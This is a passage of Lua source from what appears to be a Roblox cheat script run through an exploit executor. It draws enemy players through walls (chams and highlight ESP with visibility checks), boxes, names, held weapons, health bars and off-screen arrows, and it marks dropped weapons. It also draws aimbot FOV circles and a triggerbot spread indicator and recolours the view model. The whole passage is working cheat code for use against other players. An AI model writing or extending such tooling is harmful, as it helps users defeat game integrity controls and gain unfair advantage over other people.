    local state = EspRuntime.Chams[player]
    if state then
        clearPartChams(state)
        clearHighlightChams(player, state)
        EspRuntime.Chams[player] = nil
    else
        clearHighlightChams(player, nil)
    end
end

local CHAM_PAD = Vector3.new(0.05, 0.05, 0.05)

local function getChamsVisibility(player, character)
    local now = tick()
    local cached = ChamsVisCache[player]
    if cached and cached.character == character and (now - cached.t) < 0.06 then
        return cached.fillColor, cached.fillTransparency, cached.onScreenVisible
    end
    local visibleColor = EspFrameCache.colors.chamsVisible or Color3.fromRGB(0, 255, 120)
    local wallColor = EspFrameCache.colors.chamsWall or Color3.fromRGB(255, 60, 60)
    local vt = math.clamp(EspFrameCache.chamsVisibleTransparency or 0.35, 0, 1)
    local wt = math.clamp(EspFrameCache.chamsWallTransparency or 0.35, 0, 1)
    local checkPart = character:FindFirstChild("Head") or character:FindFirstChild("UpperTorso") or character:FindFirstChild("HumanoidRootPart")
    local onScreenVisible = false
    if checkPart then
        local cam = getCamera()
        if cam then
            local _, onScreen = cam:WorldToViewportPoint(checkPart.Position)
            if onScreen then onScreenVisible = isStrictRayVisible(checkPart) end
        end
    end
    local fillColor = onScreenVisible and visibleColor or wallColor
    local fillTransparency = onScreenVisible and vt or wt
    ChamsVisCache[player] = {
        character = character,
        t = now,
        fillColor = fillColor,
        fillTransparency = fillTransparency,
        onScreenVisible = onScreenVisible,
    }
    return fillColor, fillTransparency, onScreenVisible
end

local function createChamsPair(part)
    local isHead = part.Name == "Head"
    local inner, outer
    if isHead then
        inner, outer = Instance.new("CylinderHandleAdornment"), Instance.new("CylinderHandleAdornment")
        local cf = CFrame.Angles(math.rad(90), 0, 0)
        inner.CFrame, outer.CFrame = cf, cf
        inner.Radius, outer.Radius, inner.Height, outer.Height = 0.58, 0.58, 1.2, 1.2
    else
        inner, outer = Instance.new("BoxHandleAdornment"), Instance.new("BoxHandleAdornment")
        local sz = part.Size + CHAM_PAD
        inner.Size, outer.Size = sz, sz
    end
    inner.Name, outer.Name, inner.Adornee, outer.Adornee = "inner", "outer", part, part
    inner.AlwaysOnTop, outer.AlwaysOnTop, inner.ZIndex, outer.ZIndex = true, false, 5, 1
    inner.Parent, outer.Parent = part, part
    return {inner = inner, outer = outer}
end

local function isChamsPairValid(pair, part)
    return pair and pair.inner and pair.inner.Parent == part and pair.outer and pair.outer.Parent == part
        and pair.inner.Adornee == part and pair.outer.Adornee == part
end

local function updatePartChams(player, character, state)
    clearHighlightChams(player, state)
    if not state.Parts then state.Parts = {} end
    local fillColor, fillTransparency, onScreenVisible = getChamsVisibility(player, character)
    local seen = state.Seen or {}
    table.clear(seen)
    state.Seen = seen
    for _, part in ipairs(character:GetChildren()) do
        if part:IsA("BasePart") and CONSTANTS.RealHitboxLookup[part.Name]
            and part.Name ~= "HumanoidRootPart" and part.Name ~= "HeadHB" and part.Name ~= "FakeHead" then
            seen[part] = true
            local pair = state.Parts[part]
            if not isChamsPairValid(pair, part) then
                destroyPair(pair)
                local ei, eo = part:FindFirstChild("inner"), part:FindFirstChild("outer")
                if ei and eo and ei:IsA("HandleAdornment") and eo:IsA("HandleAdornment") then
                    pair = {inner = ei, outer = eo}
                    pair.inner.Adornee, pair.outer.Adornee = part, part
                else
                    if ei then pcall(function() ei:Destroy() end) end
                    if eo then pcall(function() eo:Destroy() end) end
                    pair = createChamsPair(part)
                end
                state.Parts[part] = pair
            end
            if part.Name ~= "Head" then
                local sz = part.Size + CHAM_PAD
                if pair.inner.Size ~= sz then pair.inner.Size = sz end
                if pair.outer.Size ~= sz then pair.outer.Size = sz end
            end
            if pair.inner.Color3 ~= fillColor then pair.inner.Color3 = fillColor end
            if pair.inner.Transparency ~= fillTransparency then pair.inner.Transparency = fillTransparency end
            if not pair.inner.AlwaysOnTop then pair.inner.AlwaysOnTop = true end
            if not pair.inner.Visible then pair.inner.Visible = true end
            if onScreenVisible then
                if pair.outer.Visible then pair.outer.Visible = false end
            else
                local outerTransparency = math.clamp(fillTransparency + 0.1, 0, 1)
                if pair.outer.Color3 ~= fillColor then pair.outer.Color3 = fillColor end
                if pair.outer.Transparency ~= outerTransparency then pair.outer.Transparency = outerTransparency end
                if pair.outer.AlwaysOnTop then pair.outer.AlwaysOnTop = false end
                if not pair.outer.Visible then pair.outer.Visible = true end
            end
        end
    end
    for part, pair in pairs(state.Parts) do
        if not seen[part] or not part.Parent then destroyPair(pair); state.Parts[part] = nil end
    end
end

local function updateHighlightChams(player, character, state)
    clearPartChams(state)
    local fillColor, fillTransparency = getChamsVisibility(player, character)
    local hl = state.Highlight
    if not (hl and hl.Parent == character) then
        pcall(function() if hl then hl:Destroy() end end)
        hl = Instance.new("Highlight")
        hl.Name = "__ChamsHighlight"
        hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        hl.Adornee = character
        hl.Parent = character
        state.Highlight = hl
        EspRuntime.Highlights[player] = hl
    end
    if hl.FillColor ~= fillColor then hl.FillColor = fillColor end
    if hl.OutlineColor ~= fillColor then hl.OutlineColor = fillColor end
    if hl.FillTransparency ~= fillTransparency then hl.FillTransparency = fillTransparency end
    if hl.OutlineTransparency ~= 0 then hl.OutlineTransparency = 0 end
end

Shared.updatePlayerChams = function(player, character)
    if not player or player == LocalPlayer or not character or not character.Parent then
        Shared.removePlayerChams(player)
        return
    end
    if not EspFrameCache.toggles.chams or (EspFrameCache.toggles.teamCheck and isSameTeamPlayer(player)) then
        Shared.removePlayerChams(player)
        return
    end
    if not character:FindFirstChild("HumanoidRootPart") then
        Shared.removePlayerChams(player)
        return
    end
    local state = EspRuntime.Chams[player]
    if state and state.Character ~= character then
        Shared.removePlayerChams(player)
        state = nil
    end
    if not state then
        state = {Character = character, Parts = {}, Highlight = nil, Seen = {}}
        EspRuntime.Chams[player] = state
    end
    if EspFrameCache.toggles.chamsType == "Part" then
        updatePartChams(player, character, state)
    else
        updateHighlightChams(player, character, state)
    end
end

Shared.updatePlayerEsp = function(player)
    if not player or not player.Parent then return end
    Shared.updatePlayerChams(player, player.Character)
    if player == LocalPlayer then
        local ds = EspRuntime.Drawings[player]
        if ds then Shared.hideDrawingSet(ds, true) end
        return
    end
    if not EspFrameCache.anyEnabled then
        local ds = EspRuntime.Drawings[player]
        if ds then Shared.hideDrawingSet(ds, true) end
        return
    end
    local drawingSet = Shared.getDrawingSet(player)
    if EspFrameCache.toggles.teamCheck and isSameTeamPlayer(player) then
        Shared.hideDrawingSet(drawingSet, true)
        return
    end
    local character, humanoid, rootPart = getCachedCharacterParts(player)
    if not character or not rootPart then
        Shared.hideDrawingSet(drawingSet, true)
        return
    end
    local camera = getCamera()
    if not camera then
        Shared.hideDrawingSet(drawingSet, true)
        return
    end
    local left, top, width, height = getCharacterScreenBox(character, humanoid, rootPart)
    if left == nil then
        drawingSet.Box.Visible, drawingSet.BoxOutline.Visible, drawingSet.BoxFill.Visible = false, false, false
        drawingSet.Name.Visible, drawingSet.Weapon.Visible = false, false
        drawingSet.HealthBarOutline.Visible, drawingSet.HealthBarFill.Visible, drawingSet.HealthText.Visible = false, false, false
        if EspFrameCache.toggles.oof and drawingSet.OofArrow and drawingSet.OofArrowOutline then
            local camCf = camera.CFrame
            local dir = camCf:PointToObjectSpace(rootPart.Position)
            if dir.Z >= 0 then dir = Vector3.new(dir.X, dir.Y, 0.001) end
            local angle = math.atan2(dir.Z, dir.X)
            local cx, sy = math.cos(angle), math.sin(angle)
            local cx1, sy1 = math.cos(angle + math.pi * 0.5), math.sin(angle + math.pi * 0.5)
            local cx2, sy2 = math.cos(angle + math.pi * 1.5), math.sin(angle + math.pi * 1.5)
            local viewport = camera.ViewportSize
            local bigger, smaller = math.max(viewport.X, viewport.Y), math.min(viewport.X, viewport.Y)
            local arrowSize = math.clamp(EspFrameCache.options.oofSize or 12, 4, 40)
            local arrowPct = math.clamp(EspFrameCache.options.oofDistance or 40, 10, 100)
            local arrowOrigin = viewport * 0.5 + Vector2.new(cx * bigger * arrowPct / 200, sy * smaller * arrowPct / 200)
            local color = EspFrameCache.colors.oof or Color3.fromRGB(255, 255, 255)
            drawingSet.OofArrow.PointA = arrowOrigin + Vector2.new(arrowSize * 2 * cx, arrowSize * 2 * sy)
            drawingSet.OofArrow.PointB = arrowOrigin + Vector2.new(arrowSize * cx1, arrowSize * sy1)
            drawingSet.OofArrow.PointC = arrowOrigin + Vector2.new(arrowSize * cx2, arrowSize * sy2)
            drawingSet.OofArrow.Color, drawingSet.OofArrow.Filled, drawingSet.OofArrow.Visible = color, true, true
            drawingSet.OofArrowOutline.PointA, drawingSet.OofArrowOutline.PointB, drawingSet.OofArrowOutline.PointC =
                drawingSet.OofArrow.PointA, drawingSet.OofArrow.PointB, drawingSet.OofArrow.PointC
            drawingSet.OofArrowOutline.Color = Color3.new(color.R * 0.35, color.G * 0.35, color.B * 0.35)
            drawingSet.OofArrowOutline.Filled, drawingSet.OofArrowOutline.Visible = false, true
        else
            if drawingSet.OofArrow then drawingSet.OofArrow.Visible = false end
            if drawingSet.OofArrowOutline then drawingSet.OofArrowOutline.Visible = false end
        end
        return
    end
    if drawingSet.OofArrow then drawingSet.OofArrow.Visible = false end
    if drawingSet.OofArrowOutline then drawingSet.OofArrowOutline.Visible = false end

    local showBox = EspFrameCache.toggles.box
    local showName = EspFrameCache.toggles.name
    local showBoxFill = EspFrameCache.toggles.boxFill
    local boxPos, boxSize = Vector2.new(left, top), Vector2.new(width, height)
    local bottom, centerX = top + height, left + width * 0.5

    if showBox then
        drawingSet.Box.Size, drawingSet.Box.Position = boxSize, boxPos
        drawingSet.Box.Color = EspFrameCache.colors.box
        drawingSet.Box.Thickness = CONSTANTS.ESP_BOX_THICKNESS
        drawingSet.Box.Visible = true

        drawingSet.BoxOutline.Size, drawingSet.BoxOutline.Position = boxSize, boxPos
        drawingSet.BoxOutline.Color = Color3.fromRGB(0, 0, 0)
        drawingSet.BoxOutline.Thickness = CONSTANTS.ESP_BOX_OUTLINE_THICKNESS
        drawingSet.BoxOutline.Visible = true
    else
        drawingSet.Box.Visible, drawingSet.BoxOutline.Visible = false, false
    end

    if showBoxFill then
        drawingSet.BoxFill.Position, drawingSet.BoxFill.Size = boxPos, boxSize
        drawingSet.BoxFill.Color, drawingSet.BoxFill.Transparency, drawingSet.BoxFill.Visible =
            EspFrameCache.colors.boxFill, EspFrameCache.boxFillTransparency, true
    else
        drawingSet.BoxFill.Visible = false
    end

    local font, fontSize = CONSTANTS.ESP_FONT, CONSTANTS.ESP_TEXT_SIZE
    drawingSet.Name.Text, drawingSet.Name.Position = player.Name, Vector2.new(centerX, top - 15)
    drawingSet.Name.Color, drawingSet.Name.Font, drawingSet.Name.Size, drawingSet.Name.Visible =
        EspFrameCache.colors.name, font, fontSize, showName

    local weaponName = getCachedEquippedTool(player, character)
    drawingSet.Weapon.Text, drawingSet.Weapon.Position = weaponName, Vector2.new(centerX, bottom + 3)
    drawingSet.Weapon.Color, drawingSet.Weapon.Font, drawingSet.Weapon.Size = EspFrameCache.colors.weapon, font, fontSize
    drawingSet.Weapon.Visible = EspFrameCache.toggles.weapon and weaponName ~= ""

    if EspFrameCache.toggles.healthBar and humanoid then
        local maxHp = humanoid.MaxHealth
        local hpPercent = maxHp > 0 and math.clamp(humanoid.Health / maxHp, 0, 1) or 0
        local barScale = math.clamp(height / 120, 0.2, 1)
        local barW = math.max(1, CONSTANTS.ESP_HEALTH_BAR_WIDTH * barScale)
        local outTh = math.max(1, CONSTANTS.ESP_HEALTH_BAR_OUTLINE_THICKNESS * barScale)
        local gap = math.max(1, CONSTANTS.ESP_HEALTH_BAR_GAP * barScale)
        local barX = left - barW - gap
        local barY = top
        local showOutline = EspFrameCache.toggles.healthBarOutline
        drawingSet.HealthBarOutline.Position = Vector2.new(barX, barY)
        drawingSet.HealthBarOutline.Size = Vector2.new(barW, height)
        drawingSet.HealthBarOutline.Color = Color3.fromRGB(0, 0, 0)
        drawingSet.HealthBarOutline.Thickness = outTh
        drawingSet.HealthBarOutline.Filled = false
        drawingSet.HealthBarOutline.Visible = showOutline
        local fillH = height * hpPercent
        drawingSet.HealthBarFill.Position = Vector2.new(barX, barY + (height - fillH))
        drawingSet.HealthBarFill.Size = Vector2.new(barW, fillH)
        drawingSet.HealthBarFill.Color = EspFrameCache.colors.healthLow:Lerp(EspFrameCache.colors.healthHigh, hpPercent)
        drawingSet.HealthBarFill.Filled = true
        drawingSet.HealthBarFill.Visible = true
        local hp = math.floor(humanoid.Health + 0.5)
        if hp < 100 then
            drawingSet.HealthText.Text = tostring(hp)
            drawingSet.HealthText.Position = Vector2.new(barX - 8, barY + (height - fillH) - 2)
            drawingSet.HealthText.Color, drawingSet.HealthText.Font, drawingSet.HealthText.Size =
                Color3.fromRGB(255, 255, 255), font, fontSize
            drawingSet.HealthText.Visible = true
        else
            drawingSet.HealthText.Visible = false
        end
    else
        drawingSet.HealthBarOutline.Visible, drawingSet.HealthBarFill.Visible, drawingSet.HealthText.Visible = false, false, false
    end
end

Shared.updateItemEsp = function()
    if not EspFrameCache.toggles.item then
        for item, t in pairs(EspRuntime.ItemDrawings) do
            if t then pcall(function() t.Visible = false; t:Remove() end) end
            EspRuntime.ItemDrawings[item] = nil
        end
        return
    end
    local debris = Workspace:FindFirstChild("Debris")
    if not debris then return end
    local camera = getCamera()
    if not camera then return end
    local weapons = getWeaponsFolder()
    if not weapons then return end
    local itemColor, seenItems = EspFrameCache.colors.item or Color3.fromRGB(255, 255, 255), {}
    local font, fontSize = CONSTANTS.ESP_FONT, CONSTANTS.ESP_TEXT_SIZE
    for _, item in ipairs(debris:GetChildren()) do
        if weapons:FindFirstChild(item.Name) then
            local pos
            if item:IsA("BasePart") then
                pos = item.Position
            elseif item:IsA("Model") then
                pos = item:GetPivot().Position
            else
                local part = item:FindFirstChild("Handle") or item:FindFirstChildWhichIsA("BasePart", true)
                if part then pos = part.Position end
            end
            if pos then
                seenItems[item] = true
                local t = EspRuntime.ItemDrawings[item]
                if not t then
                    t = Drawing.new("Text")
                    t.Visible, t.Center, t.Outline, t.Transparency = false, true, true, 1
                    EspRuntime.ItemDrawings[item] = t
                end
                t.Font, t.Size = font, fontSize
                local screenPos, onScreen = camera:WorldToViewportPoint(pos)
                if onScreen and screenPos.Z > 0 then
                    t.Text, t.Position, t.Color, t.Visible = item.Name, Vector2.new(screenPos.X, screenPos.Y), itemColor, true
                else
                    t.Visible = false
                end
            end
        end
    end
    for item, t in pairs(EspRuntime.ItemDrawings) do
        if not seenItems[item] or not item.Parent then
            if t then pcall(function() t.Visible = false; t:Remove() end) end
            EspRuntime.ItemDrawings[item] = nil
        end
    end
end


local function makeFovCircle()
    local ok, c = pcall(Drawing.new, "Circle")
    if not ok or not c then return nil end
    c.Visible, c.Thickness, c.NumSides, c.Filled, c.Color = false, 1.5, 48, false, Color3.fromRGB(255, 255, 255)
    return c
end

Shared.ensureFovCircles = function()
    if not AimRuntime.AimFovCircle then AimRuntime.AimFovCircle = makeFovCircle() end
    if not AimRuntime.RageFovCircle then AimRuntime.RageFovCircle = makeFovCircle() end
    if not AimRuntime.SpreadCircle then
        AimRuntime.SpreadCircle = makeFovCircle()
        if AimRuntime.SpreadCircle then
            AimRuntime.SpreadCircle.Filled = true
            AimRuntime.SpreadCircle.Transparency = 0.2
        end
    end
    if not AimRuntime.SpreadText then
        local ok, text = pcall(Drawing.new, "Text")
        if ok and text then
            text.Visible, text.Center, text.Outline, text.Transparency = false, true, true, 1
            text.Size, text.Font, text.ZIndex = 13, Drawing.Fonts.Plex, 3
            AimRuntime.SpreadText = text
        end
    end
end

Shared.updateFovCircle = function()
    Shared.ensureFovCircles()
    local cam = getCamera()
    if not cam then return end
    local center = Vector2.new(cam.ViewportSize.X / 2, cam.ViewportSize.Y / 2)
    local aimCircle = AimRuntime.AimFovCircle
    if aimCircle then
        local show = tv("AimbotShowFOV") and tv("AimbotEnable") and getAimFov() < 180
        if show then
            aimCircle.Position, aimCircle.Radius = center, math.min(getAimFovRadius(), 100000)
            aimCircle.Color, aimCircle.Visible = getOptionColor("AimbotFOVColor", Color3.fromRGB(255, 255, 255)), true
        else
            aimCircle.Visible = false
        end
    end
    if AimRuntime.RageFovCircle then AimRuntime.RageFovCircle.Visible = false end
    local spreadCircle = AimRuntime.SpreadCircle
    local spreadText = AimRuntime.SpreadText
    if spreadCircle then
        local showSpread = Toggles.MiscSpreadVisualizer and Toggles.MiscSpreadVisualizer.Value
        local spreadRadius = showSpread and TriggerbotState.getSpreadPixels() or 0
        if spreadRadius > 0 then
            spreadCircle.Position = center
            spreadCircle.Radius = math.min(spreadRadius, math.max(cam.ViewportSize.X, cam.ViewportSize.Y))
            spreadCircle.Color = getOptionColor("MiscSpreadVisualizerColor", Color3.fromRGB(255, 180, 60))
            spreadCircle.Visible = true
            if spreadText then
                local coverage = 0
                local targetPart = TriggerbotState.TargetPart
                if targetPart and targetPart.Parent and targetPart:IsA("BasePart") then
                    coverage = TriggerbotState.getCoveragePercent(targetPart)
                end
                spreadText.Text = string.format("%d%%", math.floor(coverage + 0.5))
                spreadText.Position = center + Vector2.new(0, spreadRadius + 14)
                spreadText.Color, spreadText.Visible = spreadCircle.Color, true
            end
        else
            spreadCircle.Visible = false
            if spreadText then spreadText.Visible = false end
        end
    end
end

Shared.CrosshairState = { Circle = nil, Outline = nil, StateText = nil, Created = false }

local function makeDotCircle(radius, color, filled, z)
    local ok, c = pcall(Drawing.new, "Circle")
    if not ok or not c then return nil end
    c.Visible, c.Radius, c.Color, c.Thickness, c.NumSides, c.Filled, c.ZIndex = false, radius, color, 1, 16, filled, z
    return c
end

ensureCrosshair = function()
    if Shared.CrosshairState.Created then return end
    Shared.CrosshairState.Circle = makeDotCircle(2, Color3.fromRGB(255, 255, 255), true, 2)
    Shared.CrosshairState.Outline = makeDotCircle(3, Color3.fromRGB(0, 0, 0), false, 1)
    local ok, st = pcall(Drawing.new, "Text")
    if ok and st then
        st.Visible, st.Center, st.Outline, st.Transparency, st.Size = false, true, true, 1, 13
        st.Font, st.Color, st.ZIndex = Drawing.Fonts.Plex, Color3.fromRGB(255, 255, 255), 2
        Shared.CrosshairState.StateText = st
    end
    Shared.CrosshairState.Created = true
end

Shared.getMovementStateText = function()
    local _, humanoid, rootPart = MoveUtil.getAliveMovementRig()
    if not humanoid or not rootPart then return "" end
    local isCrouching = UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) or humanoid.HipHeight < 1.5
    if isCrouching then return humanoid.FloorMaterial == Enum.Material.Air and "Ducking" or "Crouching" end
    if humanoid.FloorMaterial == Enum.Material.Air then return "In air" end
    if humanoid.Sit then return "Sitting" end
    local vel = rootPart.AssemblyLinearVelocity
    local horizMag = math.sqrt(vel.X * vel.X + vel.Z * vel.Z)
    if horizMag > 1 then return horizMag > 20 and "Running" or "Walking" end
    return "Standing"
end

updateCrosshair = function()
    ensureCrosshair()
    if not Shared.CrosshairState.Circle then return end

    local cam = getCamera()
    if cam then
        local viewport = cam.ViewportSize
        local center = Vector2.new(viewport.X / 2, viewport.Y / 2)
        RageHitLog.draw(center)
    end

    local enabled = Toggles.MiscCenterDot and Toggles.MiscCenterDot.Value
    local showState = Toggles.MiscStateIndicator and Toggles.MiscStateIndicator.Value

    if not enabled and not showState then
        Shared.CrosshairState.Circle.Visible = false
        if Shared.CrosshairState.Outline then Shared.CrosshairState.Outline.Visible = false end
        if Shared.CrosshairState.StateText then Shared.CrosshairState.StateText.Visible = false end
        return
    end

    if not cam then return end
    local viewport = cam.ViewportSize
    local center = Vector2.new(viewport.X / 2, viewport.Y / 2)

    if enabled then
        local col = getOptionColor("MiscCenterDotColor", Color3.fromRGB(255, 255, 255))
        Shared.CrosshairState.Circle.Position = center
        Shared.CrosshairState.Circle.Color = col
        Shared.CrosshairState.Circle.Visible = true
        if Shared.CrosshairState.Outline then
            Shared.CrosshairState.Outline.Position = center
            Shared.CrosshairState.Outline.Visible = true
        end
    else
        Shared.CrosshairState.Circle.Visible = false
        if Shared.CrosshairState.Outline then Shared.CrosshairState.Outline.Visible = false end
    end

    if showState and Shared.CrosshairState.StateText then
        local stateStr = Shared.getMovementStateText()
        if stateStr ~= "" then
            Shared.CrosshairState.StateText.Text = stateStr
            Shared.CrosshairState.StateText.Position = Vector2.new(center.X, center.Y + 20)
            Shared.CrosshairState.StateText.Color = getOptionColor("MiscStateIndicatorColor", Color3.fromRGB(255, 255, 255))
            Shared.CrosshairState.StateText.Visible = true
        else
            Shared.CrosshairState.StateText.Visible = false
        end
    else
        if Shared.CrosshairState.StateText then Shared.CrosshairState.StateText.Visible = false end
    end
end

Shared.VMState = {
    arms = nil, appliedSig = nil, weaponParts = {}, armModels = {},
    knife = false, handle = nil, childConn = nil, ancestryConn = nil,
}

local FORCEFIELD_TEXTURES = {SmoothPlastic = "", ForceField = "rbxassetid://4573037993"}
local VMPropertyCache = {}
local function hasProperty(obj, prop)
    if not obj then return false end
    local key = obj.ClassName .. "." .. prop
    local cached = VMPropertyCache[key]
    if cached ~= nil then return cached end
    local ok = pcall(function() local _ = obj[prop] end)
    VMPropertyCache[key] = ok
    return ok
end

local VM_WEAPON_PARTS = {Part=true,Silencer2=true,Silencer=true,Suppressed=true,Handle=true,Handle2=true,Blade=true,StatClock=true}
local function isWeaponViewPart(inst)
    if not inst then return false end
    local n = inst.Name
    if n == "Flash" or n == "FlashS" or n == "2Flash" or n == "Muzzle" then return false end
    if inst:IsA("MeshPart") then return true end
    return (inst:IsA("BasePart") and VM_WEAPON_PARTS[n]) and true or false
end

local function applyWeaponPartChams(part, color, matEnum, transparency, reflectance, forceTransparency)
    if not part or not part:IsA("BasePart") then return end
    if part.Name == "StatClock" then part:ClearAllChildren() end
    part.Color, part.Material = color, matEnum
    if forceTransparency or part.Transparency < 1 then part.Transparency = transparency end
    if hasProperty(part, "TextureID") then part.TextureID = "" end
    if hasProperty(part, "Reflectance") then part.Reflectance = reflectance end
    local sa = part:FindFirstChildOfClass("SurfaceAppearance")
    if sa then sa:Destroy() end
end

local function rebuildViewModelCache(arms)
    local st = Shared.VMState
    st.arms = arms
    table.clear(st.weaponParts); table.clear(st.armModels)
    st.knife, st.handle = false, nil
    for _, child in ipairs(arms:GetChildren()) do
        local name = child.Name
        if isWeaponViewPart(child) then st.weaponParts[#st.weaponParts + 1] = child end
        if string.find(name, "Knife", 1, true) or name == "Handle2" or name == "Blade" then st.knife = true end
        if name == "Handle" then st.handle = child end
        if child:IsA("Model") then st.armModels[#st.armModels + 1] = child end
    end
end

local function ensureViewModelCache(arms)
    local st = Shared.VMState
    if st.arms == arms then return end
    if st.childConn then pcall(function() st.childConn:Disconnect() end); st.childConn = nil end
    if st.ancestryConn then pcall(function() st.ancestryConn:Disconnect() end); st.ancestryConn = nil end
    rebuildViewModelCache(arms)
    st.appliedSig = nil
    st.childConn = arms.ChildAdded:Connect(function()
        if Shared.VMState.arms == arms then rebuildViewModelCache(arms); Shared.VMState.appliedSig = nil end
    end)
    st.ancestryConn = arms.AncestryChanged:Connect(function(_, parent)
        if not parent and Shared.VMState.arms == arms then
            Shared.VMState.arms, Shared.VMState.appliedSig = nil, nil
            if Shared.VMState.childConn then pcall(function() Shared.VMState.childConn:Disconnect() end); Shared.VMState.childConn = nil end
            if Shared.VMState.ancestryConn then pcall(function() Shared.VMState.ancestryConn:Disconnect() end); Shared.VMState.ancestryConn = nil end
        end
    end)
end

local function getViewModelSettingsSig(weaponChams, armChams, removeSleeves, removeGloves)
    local wc = getOptionColor("VMWeaponColor", Color3.fromRGB(255, 255, 255))
    local ac = getOptionColor("VMArmColor", Color3.fromRGB(255, 255, 255))
    return table.concat({
        weaponChams and "1" or "0", armChams and "1" or "0", removeSleeves and "1" or "0", removeGloves and "1" or "0",
        Options.VMWeaponMaterial and Options.VMWeaponMaterial.Value or "SmoothPlastic",
        tostring(Options.VMWeaponTransparency and Options.VMWeaponTransparency.Value or 0),
        tostring(Options.VMWeaponReflectance and Options.VMWeaponReflectance.Value or 0),
        Options.VMArmMaterial and Options.VMArmMaterial.Value or "SmoothPlastic",
        tostring(Options.VMArmTransparency and Options.VMArmTransparency.Value or 0), tostring(wc), tostring(ac),
    }, "|")
end

updateViewModelVisuals = function()
    local weaponChams = Toggles.VMWeaponChams and Toggles.VMWeaponChams.Value
    local armChams = Toggles.VMArmChams and Toggles.VMArmChams.Value
    local removeSleeves = Toggles.VMRemoveSleeves and Toggles.VMRemoveSleeves.Value
    local removeGloves = Toggles.VMRemoveGloves and Toggles.VMRemoveGloves.Value
    if not weaponChams and not armChams and not removeSleeves and not removeGloves then return end
    local cam = getCamera()
    local arms = cam and cam:FindFirstChild("Arms")
    if not arms then return end
    ensureViewModelCache(arms)
    local sig, st = getViewModelSettingsSig(weaponChams, armChams, removeSleeves, removeGloves), Shared.VMState
    local now = tick()
    if st.appliedSig == sig and st.lastForceApply and now - st.lastForceApply < 0.35 then return end
    st.appliedSig, st.lastForceApply = sig, now
    local weaponColor = getOptionColor("VMWeaponColor", Color3.fromRGB(255, 255, 255))
    local weaponMaterial = Options.VMWeaponMaterial and Options.VMWeaponMaterial.Value or "SmoothPlastic"
    local weaponTransparency = (Options.VMWeaponTransparency and Options.VMWeaponTransparency.Value or 0) / 100
    local weaponReflectance = (Options.VMWeaponReflectance and Options.VMWeaponReflectance.Value or 0) / 50
    local armColor = getOptionColor("VMArmColor", Color3.fromRGB(255, 255, 255))
    local armMaterial = Options.VMArmMaterial and Options.VMArmMaterial.Value or "SmoothPlastic"
    local armTransparency = (Options.VMArmTransparency and Options.VMArmTransparency.Value or 0) / 100
    local weaponMatEnum = Enum.Material[weaponMaterial] or Enum.Material.SmoothPlastic
    local armMatEnum = Enum.Material[armMaterial] or Enum.Material.SmoothPlastic
    local armVertex = Vector3.new(armColor.R, armColor.G, armColor.B)
    local ffTex = armMaterial == "ForceField" and FORCEFIELD_TEXTURES.ForceField or ""
    if weaponChams then
        for i = 1, #st.weaponParts do
            local child = st.weaponParts[i]
            if child and child.Parent then
                local n = child.Name
                applyWeaponPartChams(child, weaponColor, weaponMatEnum, weaponTransparency, weaponReflectance, not (n == "Silencer2" or n == "Silencer" or n == "Suppressed"))
            end
        end
    end
    if armChams or removeSleeves or removeGloves then
        for i = 1, #st.armModels do
            local child = st.armModels[i]
            if child and child.Parent then
                for _, desc in ipairs(child:GetDescendants()) do
                    local dName = desc.Name
                    if removeSleeves and dName == "Sleeve" and desc:GetAttribute("CW_Applied") == nil then
                        desc:Destroy()
                    elseif removeGloves and (dName == "Glove" or dName == "RGlove" or dName == "LGlove" or string.find(string.lower(dName), "glove", 1, true)) then
                        pcall(function() desc:Destroy() end)
                    elseif armChams then
                        if hasProperty(desc, "CastShadow") then desc.CastShadow = false end
                        if desc:IsA("SpecialMesh") then
                            desc.TextureId, desc.VertexColor = ffTex, armVertex
                        elseif desc:IsA("Part") then
                            desc.Material, desc.Color = armMatEnum, armColor
                            if desc.Transparency ~= 1 then desc.Transparency = math.min(armTransparency + 0.01, 1) end
                        end
                    end
                end
            end
        end
    end
    if weaponChams and st.knife and st.handle and st.handle.Parent then st.handle.Transparency = 1 end
end

Shared.cleanupViewModelVisuals = function()
    local st = Shared.VMState
    if st then
        if st.childConn then pcall(function() st.childConn:Disconnect() end) end
        if st.ancestryConn then pcall(function() st.ancestryConn:Disconnect() end) end
    end
    Shared.VMState = {
        arms = nil, appliedSig = nil, weaponParts = {}, armModels = {},
        knife = false, handle = nil, childConn = nil, ancestryConn = nil,
    }
end

Shared.SKYBOX_PRESETS = (function()
local p, R = {}, "rbxassetid://"
local function S(n,a,b,c,d,e,f) p[n]={SkyboxBk=R..a,SkyboxDn=R..b,SkyboxFt=R..c,SkyboxLf=R..d,SkyboxRt=R..e,SkyboxUp=R..f} end
S("Purple Nebula",159454299,159454296,159454293,159454286,159454300,159454288)
S("Night Sky",12064107,12064152,12064121,12063984,12064115,12064131)
S("Pink Daylight",271042516,271077243,271042556,271042310,271042467,271077958)
S("Morning Glow",1417494030,1417494146,1417494253,1417494402,1417494499,1417494643)
S("Setting Sun",626460377,626460216,626460513,626473032,626458639,626460625)
S("Fade Blue",153695414,153695352,153695452,153695320,153695383,153695471)
S("Elegant Morning",153767241,153767216,153767266,153767200,153767231,153767288)
S("Neptune",218955819,218953419,218954524,218958493,218957134,218950090)
S("Redshift",401664839,401664862,401664960,401664881,401664901,401664936)
S("Aesthetic Night",1045964490,1045964368,1045964655,1045964655,1045964655,1045962969)
S("Gloomy Gray",4495864450,4495864887,4495865458,4495866035,4495866584,4495867486)
S("Light Within Dark",15502511288,15502508460,15502510289,15502507918,15502509398,15502511911)
S("Green Space",16823270864,16823272150,16823273508,16823274898,16823276281,16823277547)
S("The Winter",7307273436,7307275898,7307282434,7307284944,7307287254,7307290025)
S("Oblivion",16642312709,16642313526,16642314757,16642315809,16642317038,16642318139)
S("Final Bloodmoon",15493709538,15493710499,15493711616,15493712720,15493713902,15493714708)
S("Clouds",570557514,570557775,570557559,570557620,570557672,570557727)
S("Twilight",264908339,264907909,264909420,264909758,264908886,264907379)
S("Red Mountain",6636457509,6636457509,6636457509,6636457509,6636457509,6636457509)
S("Cloudy Skies",252760981,252763035,252761439,252760980,252762652,252762652)
S("Dark Blue",30306692,25901058,30306730,30306626,30306665,30306603)
return p
end)()

Shared.SkyboxState = { customSky = nil, originalSky = nil, savedOriginal = false }

applySkyboxChanger = function()
    local lighting = game:GetService('Lighting')
    local enabled = Toggles.AmbienceSkyboxChanger and Toggles.AmbienceSkyboxChanger.Value

    if Shared.SkyboxState.customSky then
        Shared.SkyboxState.customSky:Destroy()
        Shared.SkyboxState.customSky = nil
    end

    if not enabled then
        if Shared.SkyboxState.originalSky and not Shared.SkyboxState.originalSky.Parent then
